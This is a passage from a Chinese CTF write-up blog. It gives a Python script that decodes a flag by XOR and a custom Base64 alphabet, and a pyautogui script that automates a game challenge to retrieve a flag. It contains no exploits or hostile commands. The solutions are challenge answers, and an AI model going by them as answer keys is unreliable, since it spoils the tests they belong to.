+</span></span><span class="line"><span class="cl"><span class="n">custom_base64</span> <span class="o">=</span> <span class="s2">&#34;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">reverse_base64</span> <span class="o">=</span> <span class="p">{</span><span class="n">char</span><span class="p">:</span> <span class="n">idx</span> <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">enumerate</span><span class="p">(</span><span class="n">custom_base64</span><span class="p">)}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 加密数据</span>
+</span></span><span class="line"><span class="cl"><span class="n">encrypted</span> <span class="o">=</span> <span class="s2">&#34;M@ASL3MF`uL3ICT2IhUgKSD2IeDsICH7Hd26HhQgKSQhNCX7TVL3UFMeHi2?&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 解密：逐字节异或还原</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">xor_decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="mi">2</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">chr</span><span class="p">(</span><span class="n">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">^</span> <span class="n">key</span><span class="p">)</span> <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 解密：Base64 自定义表解码</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">custom_base64_decode</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decoded_bytes</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="mi">4</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chunk</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 处理填充字符 &#39;=&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">padding</span> <span class="o">=</span> <span class="n">chunk</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chunk</span> <span class="o">=</span> <span class="n">chunk</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span><span class="p">)</span>  <span class="c1"># 临时替换填充字符，用于解码</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 逐字节解码</span>
+</span></span><span class="line"><span class="cl">        <span class="n">b1</span> <span class="o">=</span> <span class="n">reverse_base64</span><span class="p">[</span><span class="n">chunk</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="n">reverse_base64</span><span class="p">[</span><span class="n">chunk</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl">        <span class="n">b2</span> <span class="o">=</span> <span class="p">(</span><span class="n">reverse_base64</span><span class="p">[</span><span class="n">chunk</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">|</span> <span class="n">reverse_base64</span><span class="p">[</span><span class="n">chunk</span><span class="p">[</span><span class="mi">2</span><span class="p">]]</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">        <span class="n">b3</span> <span class="o">=</span> <span class="p">(</span><span class="n">reverse_base64</span><span class="p">[</span><span class="n">chunk</span><span class="p">[</span><span class="mi">2</span><span class="p">]]</span> <span class="o">&amp;</span> <span class="mh">0x3</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="n">reverse_base64</span><span class="p">[</span><span class="n">chunk</span><span class="p">[</span><span class="mi">3</span><span class="p">]]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">decoded_bytes</span><span class="o">.</span><span class="n">extend</span><span class="p">([</span><span class="n">b1</span><span class="p">,</span> <span class="n">b2</span><span class="p">,</span> <span class="n">b3</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 根据填充字符调整解码结果</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">padding</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">decoded_bytes</span> <span class="o">=</span> <span class="n">decoded_bytes</span><span class="p">[:</span><span class="o">-</span><span class="n">padding</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">bytes</span><span class="p">(</span><span class="n">decoded_bytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 解密过程</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">encrypted</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Step 1: 逐字节异或还原</span>
+</span></span><span class="line"><span class="cl">    <span class="n">after_xor</span> <span class="o">=</span> <span class="n">xor_decrypt</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Step 2: 使用自定义 Base64 表解码</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decoded</span> <span class="o">=</span> <span class="n">custom_base64_decode</span><span class="p">(</span><span class="n">after_xor</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">decoded</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 调用解密函数</span>
+</span></span><span class="line"><span class="cl"><span class="n">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decrypted</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;解密结果:&#34;</span><span class="p">,</span> <span class="n">decrypted</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">except</span> <span class="n">Exception</span> <span class="n">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;解密失败:&#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行得到flag</p>
+<h2 id="secret_of_inkey">secret_of_inkey
+</h2><p>进入发现是小游戏</p>
+<p>可以玩出flag来（bushi）</p>
+<p>在WP中看到了一个有趣的解法 ：使用pyautogui来进行自动化脚本操作。</p>
+<blockquote>
+<p><a class="link" href="https://juejin.cn/post/6844904190259494926"  target="_blank" rel="noopener"
+    >pyautogui（控制鼠标键盘）GitHub官方文档翻译</a></p></blockquote>
+<h3 id="payautogui">Payautogui
+</h3><p>payautogui是一个Python模块，可以以编程的方式控制键鼠
+使用脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import pyautogui
+</span></span><span class="line"><span class="cl">import time
+</span></span><span class="line"><span class="cl">from pywinauto.application import Application
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">print(&#34;脚本将在3秒后开始运行...&#34;)
+</span></span><span class="line"><span class="cl">time.sleep(3)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">start_x, start_y, end_x, end_y = 900, 210, 2080, 1390
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">grid = []
+</span></span><span class="line"><span class="cl">key = []
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">grid.append(565)
+</span></span><span class="line"><span class="cl">key.append(&#39;9fc82e15d9de6ef2&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 初始化一个集合用于记录已访问的网格位置
+</span></span><span class="line"><span class="cl">visited = set()
+</span></span><span class="line"><span class="cl">visited.add(565)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">while len(grid):
+</span></span><span class="line"><span class="cl">    current_grid = grid.pop()
+</span></span><span class="line"><span class="cl">    current_key = key.pop()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    grid_x = start_x + 38 * (current_grid % 31) + 5
+</span></span><span class="line"><span class="cl">    grid_y = start_y + 38 * (current_grid // 31) + 16
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    pyautogui.click(grid_x, grid_y)
+</span></span><span class="line"><span class="cl">    time.sleep(0.3)
+</span></span><span class="line"><span class="cl">    pyautogui.typewrite(current_key + &#39;\n&#39;)
+</span></span><span class="line"><span class="cl">    time.sleep(0.3)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    try:
+</span></span><span class="line"><span class="cl">        app = Application(backend=&#34;uia&#34;).connect(title=&#34;Right!&#34;)
+</span></span><span class="line"><span class="cl">        dialog = app.window(title=&#34;Right!&#34;)
+</span></span><span class="line"><span class="cl">        static_text = dialog.child_window(control_type=&#34;Text&#34;)
+</span></span><span class="line"><span class="cl">        text = static_text.window_text()
+</span></span><span class="line"><span class="cl">    except Exception as e:
+</span></span><span class="line"><span class="cl">        print(f&#34;无法连接到窗口: {e}&#34;)
+</span></span><span class="line"><span class="cl">        continue
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    pyautogui.typewrite(&#39;\n&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    print(text)
+</span></span><span class="line"><span class="cl">    if &#39;true&#39; in text.lower():
+</span></span><span class="line"><span class="cl">        break
+</span></span><span class="line"><span class="cl">    if &#39;nothing&#39; in text.lower():
+</span></span><span class="line"><span class="cl">        continue
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    t = text.split(&#39;\n&#39;)
+</span></span><span class="line"><span class="cl">    print(t)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    # 假设每一行都有足够的长度，添加异常处理以避免索引错误
+</span></span><span class="line"><span class="cl">    for i in range(min(4, len(t))):
+</span></span><span class="line"><span class="cl">        try:
+</span></span><span class="line"><span class="cl">            new_key = t[i][-17:-1]
+</span></span><span class="line"><span class="cl">            new_grid = int(t[i][7:10])
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            if new_grid not in visited:
+</span></span><span class="line"><span class="cl">                key.append(new_key)
+</span></span><span class="line"><span class="cl">                grid.append(new_grid)
+</span></span><span class="line"><span class="cl">                visited.add(new_grid)  # 标记为已访问
+</span></span><span class="line"><span class="cl">        except (ValueError, IndexError) as e:
+</span></span><span class="line"><span class="cl">            print(f&#34;解析第 {i} 行时出错: {e}&#34;)
+</span></span><span class="line"><span class="cl">            continue
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    print(&#34;当前已访问的网格数量:&#34;, len(visited))
+</span></span><span class="line"><span class="cl">    print(&#34;待处理的key:&#34;, key)
+</span></span><span class="line"><span class="cl">    print(&#34;待处理的grid:&#34;, grid)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到flag</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/tgctf%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TGCTF知识梳理</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/nsilab%E6%B7%98%E6%B1%B0%E8%B5%9B%E5%A4%8D%E7%8E%B0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">NSILAB淘汰赛复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/dasctf2024%E5%8D%81%E6%9C%88%E8%B5%9B/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">DASCTF2024十月赛</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 Example Person
+    </section>
+    
+    <section class="powerby">
+        
+            Build by Oight <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
